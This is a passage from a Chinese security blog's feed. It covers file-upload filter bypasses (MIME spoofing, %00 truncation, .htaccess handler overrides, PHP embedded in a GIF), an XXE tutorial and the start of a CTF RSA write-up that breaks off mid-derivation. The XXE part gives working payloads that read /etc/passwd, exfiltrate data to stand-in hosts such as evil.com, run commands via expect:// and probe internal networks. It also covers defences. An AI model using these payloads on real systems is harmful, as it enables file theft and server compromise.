class="string">'userfile'</span>][<span class="string">'type'</span>] != <span class="string">"image/gif"</span>) &#123; <span class="comment">//检测Content-type</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Sorry, we only allow uploading GIF images"</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">$uploaddir = <span class="string">'uploads/'</span>;</span><br><span class="line">$uploadfile = $uploaddir . basename($_FILES[<span class="string">'userfile'</span>][<span class="string">'name'</span>]);</span><br><span class="line"><span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'userfile'</span>][<span class="string">'tmp_name'</span>], $uploadfile))   &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"File is valid, and was successfully uploaded.\n"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"File uploading failed.\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面为php后端检测MIME类型的一个例子<br>通过判断<code>$_FILES[&#39;userfile&#39;][&#39;type&#39;] != &quot;image/gif&quot;</code>来保证上传的类型为gif类型的文件。<br>绕过这一类型的检测，可以通过burp拦包，将原<code>Content-Type</code>类型该为符合要求的<code>image/gif</code>类型。</p><h3 id="服务端检测绕过（目录路劲检测）"><a href="#服务端检测绕过（目录路劲检测）" class="headerlink" title="服务端检测绕过（目录路劲检测）"></a>服务端检测绕过（目录路劲检测）</h3><p>有一些web应用程序有多个文件夹用来存储图片文件，所以为了标识上传的图片是属于哪个文件夹的，上传文件时会带上文件存储路劲。而此时如果对文件目录路劲检测不够完全，可以通过截断攻击。（如%00,windows下%80-%90）<br>如上传时提供存储路劲为<code>image/20160704/</code>可以通过修改为<code>image/20160704/evil.php%00</code>来达到截断目的。后端程序会将该路劲连接为<code>image/20160704/evil.php%00filename.gif</code>00截断导致最终存储的文件名为evil.php</p><h3 id="服务器端检测绕过（文件扩展名检测）"><a href="#服务器端检测绕过（文件扩展名检测）" class="headerlink" title="服务器端检测绕过（文件扩展名检测）"></a>服务器端检测绕过（文件扩展名检测）</h3><ol><li>黑名单检测<br>黑名单检测通常会有一个文件后缀名黑名单（例如html|htm|php|php2|php3|php4|php5…）<br>但是通常黑名单检测不能包含所有的恶意脚本后缀，防护难度会比较大，推荐使用白名单<br>绕过的方法：</li></ol><ul><li>文件名大小写绕过（例如用Php，Asp等）</li><li>名单列表绕过(用黑名单中未提及的文件后缀来绕过，如asa，cer等不常见的文件后缀)</li><li>0x00截断（asp下可以尝试使用,asp为从后往前扫描扩展名，<code>evil.asp%00.jpg</code>，会被识别为jpg，只要检测方式如这种可以通过这种方式绕过）</li><li>特殊文件名绕过（只适用windows，将文件名改为evil.php.或evil.php (注意这里有一个空格),在windows下，不允许这样的命名，所以会将.和空格自动去掉）</li><li>.htaccess文件攻击（配合名单列表绕过，上传一个自定义的.htaccess，就可以轻松绕过各种检测）</li></ul><h5 id="htaccess文件攻击"><a href="#htaccess文件攻击" class="headerlink" title=".htaccess文件攻击"></a>.htaccess文件攻击</h5><p>如果黑名单中未包含.htaccess后缀的可以通过重写解析配置来达到解析的效果<br>针对php，上传自定义.htaccess<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;haha&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure></p><p>同目录有个我们上传一个只有文件名并包含字符串”haha”，但是却无任何扩展名的文件<br>里面的内容是 php 一句话木马，通过菜刀连接可以解析php<br>成因：<br>    在 PHP manual 中提到了下面一段话<br>    move_uploaded_file section, there is a warning which states ‘If the destination file already exists, it will be overwritten.’<br>    如果 PHP 安全没配置好<br>    就可以通过 move_uploaded_file 函数把自己写的.htaccess 文件覆盖掉服务器上的<br>    这样就能任意定义解析名单了</p><ul><li>解析漏洞（apache解析漏洞，iis6.0解析漏洞，nginx解析漏洞）</li></ul><h4 id="apache解析漏洞"><a href="#apache解析漏洞" class="headerlink" title="apache解析漏洞"></a>apache解析漏洞</h4><p>apache是从右到左开始判断解析，如果最右的后缀无法解析，则尝试解析后一个后缀</p><h4 id="iis6-0解析漏洞"><a href="#iis6-0解析漏洞" class="headerlink" title="iis6.0解析漏洞"></a>iis6.0解析漏洞</h4><ul><li>成因为iis6.0不解析;后面的，所以提交evil.asp;.html解析为asp类型</li><li>还有一个为IIS6.0的00截断攻击</li><li>IIS6.0双文件上传</li><li>文件夹的名字包含<code>.asp</code>则这个文件夹下的文件都以asp的形式来解析</li></ul><h4 id="iis7-0-7-5解析漏洞"><a href="#iis7-0-7-5解析漏洞" class="headerlink" title="iis7.0/7.5解析漏洞"></a>iis7.0/7.5解析漏洞</h4><p>对于php有一个类似Nginx的解析漏洞<code>evil.jpg/evil.php</code> 解析evil.jpg中的php代码，这个漏洞成因在于php-cgi的漏洞</p><h4 id="nginx解析漏洞"><a href="#nginx解析漏洞" class="headerlink" title="nginx解析漏洞"></a>nginx解析漏洞</h4><ul><li>将php文件换成其他可以通过的文件后缀，访问的时候在后面加上/.php，即evil.jpg/.php，evil.jpg会解析为php的格式</li><li>%00截断</li><li>其他方式<br>提交前将filename=”evil.php”该为”evil.php”.jpg”</li></ul><ol start="2"><li>白名单检测</li></ol><ul><li>0x00截断绕过</li><li>解析漏洞绕过（文件名不被重写）</li></ul><h3 id="服务器端检测绕过（文件内容检测）"><a href="#服务器端检测绕过（文件内容检测）" class="headerlink" title="服务器端检测绕过（文件内容检测）"></a>服务器端检测绕过（文件内容检测）</h3><p>图像类的文件内容检测</p><ul><li>文件幻数检测（图片头格式检测）<br>jpg内容头value= FF D8 FF E0 00 10 4A 46 49 46<br>gif内容头value= 47 49 46 38 39 61<br>png内容头value= 89 50 4E 47</li></ul><p>在文件头后加上一句话木马就能绕过</p><ul><li>文件相关信息检测</li></ul><p>图像文件相关信息检测常用的就是php的getimagesize()函数，可以通过修改图片的注释区（data区）插入一句话代码，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">(...some binary data for image...)</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line">(... skipping the rest of binary data ...)</span><br></pre></td></tr></table></figure></p><ul><li>文件加载检测</li></ul><p>调用API或函数去进行文件加载测试，常见的是图像渲染测试，二次渲染，可以通过上传恶意文件，再下载下来，diff一下找到不变的位置插入一句话木马，但成功率不高</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h6 id="轻量级检测绕过攻击"><a href="#轻量级检测绕过攻击" class="headerlink" title="轻量级检测绕过攻击"></a>轻量级检测绕过攻击</h6><ol><li>绕过 javascript 对扩展名的检测<br> &lt;用 burp 之类的反向代理工具直接 POST 数据包到服务端，绕过前端检测&gt;</li><li>绕过服务端对 http request 包 MIME 类型检测<br> &lt;用 burp 之类的反向代理工具伪造 POST 数据包到服务端，绕过 MIME 检测&gt;</li></ol><h6 id="路径-扩展名检测绕过攻击"><a href="#路径-扩展名检测绕过攻击" class="headerlink" title="路径/扩展名检测绕过攻击"></a>路径/扩展名检测绕过攻击</h6><ol><li><p>黑名单绕过<br> 文件名大小写绕过<br> 名单列表绕过<br> 特殊文件名绕过<br> 0x00 截断绕过<br> .htaccess 文件攻击<br> 本地包含漏洞<br> Apache 解析漏洞<br> IIS 解析漏洞<br> Nginx 解析漏洞</p></li><li><p>白名单绕过<br> 0x00 截断绕过<br> 本地文件包含漏洞<br> IIS 解析漏洞<br> Nginx 解析漏洞</p></li><li>文件内容检测绕过攻击</li></ol><h6 id="文件加载测试绕过"><a href="#文件加载测试绕过" class="headerlink" title="文件加载测试绕过"></a>文件加载测试绕过</h6><p>&lt;对文件进行代码注入再配合任意解析调用/漏洞&gt;</p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【VULNERABLITY】XML External Entity(XXE)</title>
      <link href="/2016/06/28/old-xxe/"/>
      <url>/2016/06/28/old-xxe/</url>
      
        <content type="html"><![CDATA[<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>XML的一些基础知识，摘自<a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">security.tencent.com</a><br><a id="more"></a><br>XML例子<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span>  xml声明</span><br><span class="line"><span class="meta">&lt;!DOCTYPE note[   文档类型定义</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT note (to,from,heading,body)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT to   (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT from   (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT heading   (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT body   (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span> 文档元素</span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>This is a Test<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>上述为一个XML的实例<br>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。</p><h6 id="内部声明DTD"><a href="#内部声明DTD" class="headerlink" title="内部声明DTD"></a>内部声明DTD</h6><p><code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></p><h6 id="引用外部DTD"><a href="#引用外部DTD" class="headerlink" title="引用外部DTD"></a>引用外部DTD</h6><p><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code>或者<code>&lt;!DOCTYPE 根元素 PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt;</code><br>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p><h6 id="内部声明实体"><a href="#内部声明实体" class="headerlink" title="内部声明实体"></a>内部声明实体</h6><p><code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code></p><h6 id="引用外部实体"><a href="#引用外部实体" class="headerlink" title="引用外部实体"></a>引用外部实体</h6><p><code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</code>或者<code>&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</code></p><h6 id="漏洞描述摘自OWASP"><a href="#漏洞描述摘自OWASP" class="headerlink" title="漏洞描述摘自OWASP"></a>漏洞描述摘自<a href="https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing" target="_blank" rel="noopener">OWASP</a></h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">An XML External Entity attack is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. This attack may lead to the disclosure of confidential data, denial of service, server side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts.</span><br></pre></td></tr></table></figure><p>漏洞成因为XML解析器配置不安全时，当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p><h3 id="试验"><a href="#试验" class="headerlink" title="试验"></a>试验</h3><p>恶意引入外部实体方式：</p><ul><li>本地文件读取</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY b SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>远程文件读取</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % d SYSTEM "http://evil.com/evil.dtd"&gt;</span></span><br><span class="line"><span class="meta">%d;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br><span class="line">其中evil.dtd文件内容</span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">b</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>"&gt;</span></span><br></pre></td></tr></table></figure><p>但是如果遇到读取多行的文件，可能会读不出来，这里可以看一下<a href="http://zone.wooyun.org/content/26651" target="_blank" rel="noopener">ftp接受xxe数据</a><br>不同的语言默认支持的协议不同</p><table><thead><tr><th>libxml2</th><th>php</th><th>java</th><th>.net</th></tr></thead><tbody><tr><td>file<br>http<br>ftp</td><td>file<br>http<br>ftp<br>php<br>compress.zip<br>compress.bzip2<br>data<br>glob<br>phar</td><td>http<br>https<br>ftp<br>file<br>jar<br>netdoc<br>mailto<br>gopher *</td><td>http<br>file<br>https<br>ftp</td></tr></tbody></table><p>上述为默认支持协议，还可以通过扩展支持其他协议，如php</p><table><thead><tr><th>scheme</th><th>extension required</th></tr></thead><tbody><tr><td>https<br>ftps</td><td>openssl</td></tr><tr><td>zip</td><td>zip</td></tr><tr><td>ssh2.shell<br>ssh2.exec<br>ssh2.tunnel<br>ssh2.sftp<br>ssh2.scp</td><td>ssh2</td></tr><tr><td>rar</td><td>rar</td></tr><tr><td>ogg</td><td>oggvorbis</td></tr><tr><td>expect</td><td>expect</td></tr></tbody></table><h6 id="demo1-任意读取本地文件"><a href="#demo1-任意读取本地文件" class="headerlink" title="demo1 任意读取本地文件"></a>demo1 任意读取本地文件</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$xml=<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">&lt;!ENTITY b SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;c&gt;&amp;b;&lt;/c&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">$data=simplexml_load_string($xml);</span><br><span class="line"><span class="keyword">echo</span> $data;</span><br></pre></td></tr></table></figure><h6 id="demo2-不回显读取内容，远程传递数据"><a href="#demo2-不回显读取内容，远程传递数据" class="headerlink" title="demo2 不回显读取内容，远程传递数据"></a>demo2 不回显读取内容，远程传递数据</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$xml=<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/issue"&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % dtd SYSTEM "http://ip/evil.dtd"&gt;</span></span><br><span class="line"><span class="string">%dtd;</span></span><br><span class="line"><span class="string">%send;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;c&gt;&amp;b;&lt;/c&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">$data=simplexml_load_string($xml);</span><br><span class="line">远程DTD文件内容</span><br><span class="line">&lt;!ENTITY % all <span class="string">"&lt;!ENTITY &amp;#x25 send SYSTEM 'http://ip/?xml=%file;'&gt;"</span>&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure><h6 id="demo3-执行系统命令"><a href="#demo3-执行系统命令" class="headerlink" title="demo3 执行系统命令"></a>demo3 执行系统命令</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$xml=<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">&lt;!ENTITY b SYSTEM "expect://id"&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;c&gt;&amp;b;&lt;/c&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">$data=simplexml_load_string($xml);</span><br><span class="line"><span class="keyword">echo</span> $data;</span><br></pre></td></tr></table></figure><p>执行成功需要php的expect扩展</p><h6 id="demo4-探测内网应用"><a href="#demo4-探测内网应用" class="headerlink" title="demo4 探测内网应用"></a>demo4 探测内网应用</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$xml=<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">&lt;!ENTITY b SYSTEM "http://192.168.1.20:80"&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;c&gt;&amp;b;&lt;/c&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">$data=simplexml_load_string($xml);</span><br><span class="line"><span class="keyword">echo</span> $data;</span><br></pre></td></tr></table></figure><p>如果不存在该ip的应用，会有warning failed to open stream，通过这种方式探测内容应用<br>同时如果找到了内容应用，可以通过这种方式攻击内网应用</p><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><h6 id="方案一、使用开发语言提供的禁用外部实体的方法"><a href="#方案一、使用开发语言提供的禁用外部实体的方法" class="headerlink" title="方案一、使用开发语言提供的禁用外部实体的方法"></a>方案一、使用开发语言提供的禁用外部实体的方法</h6><ol><li>PHP：<br>libxml_disable_entity_loader(true);</li><li>JAVA:<br>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();<br>dbf.setExpandEntityReferences(false);</li><li>Python：<br>from lxml import etree<br>xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</li></ol><h6 id="方案二、过滤用户提交的XML数据"><a href="#方案二、过滤用户提交的XML数据" class="headerlink" title="方案二、过滤用户提交的XML数据"></a>方案二、过滤用户提交的XML数据</h6><p>关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC。</p><h3 id="json节点的Content-Type-XXE攻击"><a href="#json节点的Content-Type-XXE攻击" class="headerlink" title="json节点的Content-Type XXE攻击"></a>json节点的Content-Type XXE攻击</h3><p>如今很多web应用程序使用的都是json格式的数据传递，通过在http request头中带入<code>Content-Type: application/json</code>表明传递的是json格式的数据。但是有时候服务器可以接受开发人员没有意料到的其他数据格式，如xml格式。如果服务器可以接受xml格式的数据，那么就有可能存在xxe。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">HTTP Request:</span><br><span class="line"></span><br><span class="line">POST /netspi HTTP/1.1</span><br><span class="line">Host: someserver.netspi.com</span><br><span class="line">Accept: application/json</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 38</span><br><span class="line"></span><br><span class="line">&#123;&quot;search&quot;:&quot;name&quot;,&quot;value&quot;:&quot;netspitest&quot;&#125;</span><br><span class="line"></span><br><span class="line">HTTP Response:</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 43</span><br><span class="line"></span><br><span class="line">&#123;&quot;error&quot;: &quot;no results for name netspitest&quot;&#125;</span><br></pre></td></tr></table></figure></p><p>将如上的<code>Content-Type</code>改为xml格式的再发送<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">HTTP Request:</span><br><span class="line"></span><br><span class="line">POST /netspi HTTP/1.1</span><br><span class="line">Host: someserver.netspi.com</span><br><span class="line">Accept: application/json</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 112</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;search&gt;name&lt;/search&gt;</span><br><span class="line">&lt;value&gt;netspitest&lt;/value&gt;</span><br><span class="line">&lt;/root&gt;</span><br><span class="line"></span><br><span class="line">HTTP Response:</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 43</span><br><span class="line"></span><br><span class="line">&#123;&quot;error&quot;: &quot;no results for name netspitest&quot;&#125;</span><br></pre></td></tr></table></figure></p><p>如果返回的数据是一样的，那么就说明服务器可以接受xml格式的数据，那么我们就可以利用xxe来攻击<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">HTTP Request:</span><br><span class="line"></span><br><span class="line">POST /netspi HTTP/1.1</span><br><span class="line">Host: someserver.netspi.com</span><br><span class="line">Accept: application/json</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 288</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;search&gt;name&lt;/search&gt;</span><br><span class="line">&lt;value&gt;&amp;xxe;&lt;/value&gt;</span><br><span class="line">&lt;/root&gt;</span><br><span class="line"></span><br><span class="line">HTTP Response:</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 2467</span><br><span class="line"></span><br><span class="line">&#123;&quot;error&quot;: &quot;no results for name root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync....</span><br></pre></td></tr></table></figure></p><p>但是并不是所有的json节点都是接受xml格式的数据的。有可能返回解析错误的提示或者415不支持媒体类型的错误消息</p><h5 id="带上一个xxe-cheat-sheet，DTD-Attacks"><a href="#带上一个xxe-cheat-sheet，DTD-Attacks" class="headerlink" title="带上一个xxe-cheat-sheet，DTD-Attacks"></a>带上一个<a href="http://web-in-security.blogspot.hk/2016/03/xxe-cheat-sheet.html" target="_blank" rel="noopener">xxe-cheat-sheet</a>，<a href="https://github.com/RUB-NDS/DTD-Attacks" target="_blank" rel="noopener">DTD-Attacks</a></h5><h2 id="参考security-tencent-com，91ri-org"><a href="#参考security-tencent-com，91ri-org" class="headerlink" title="参考security.tencent.com，91ri.org"></a>参考<a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">security.tencent.com</a>，<a href="https://www.91ri.org/12814.html" target="_blank" rel="noopener">91ri.org</a></h2>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CTF】BCTF Crypto SpecialRSA writeup</title>
      <link href="/2016/03/20/old-CTF-BCTF-Crypto-SpecialRSA-writeup/"/>
      <url>/2016/03/20/old-CTF-BCTF-Crypto-SpecialRSA-writeup/</url>
      
        <content type="html"><![CDATA[<h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="http://blog.0kami.cn/images/bctf/specialRSA.jpg" alt="题目描述"><br><a id="more"></a><br>将附带的<a href="http://blog.0kami.cn/static/special_rsa.zip" title="zip">zip</a>文件下载并解压。可以看到以下几个文件：</p><ul><li>加密算法</li><li>示例密文</li><li>示例明文</li><li>加密的flag文件<br>大致我们可以看出来，题目的意图为通过示例密明文，算出加密秘钥k，然后通过k解密flag文件。阅读加解密算法，我们可以得出以下的数学公式：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcd(k,N)=1,kd+Ny=1,c=&gt;criphertext,m=&gt;plaintext</span><br><span class="line">   encode c=[(k^r%N)*m]%N</span><br><span class="line">   decode m=[(d^r%N)*c]%N</span><br><span class="line">   已知2组(m,r,c) N 的值</span><br><span class="line">   求解k</span><br></pre></td></tr></table></figure></li></ul><p>到这里卡了很久，一直没个正确的方式来获取k，不用数学就会忘记啊啊啊啊啊啊啊。后来求组了老师，得到了一个思路。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">下面所有^-1表示对应的乘法逆元</span><br><span class="line">   假设gcd(r1,r2)=1,那么存在a,b使得公式r1*a+r2*b=1</span><br><span class="line">   那么   k^1</span><br><span class="line">         =k^(r1*a+r2*b)</span><br><span class="line">         =k^(r1*a) * k^(r2*b)</span><br><span class="line">         =(k^r1)^a * (k^r2)^b</span><br><span 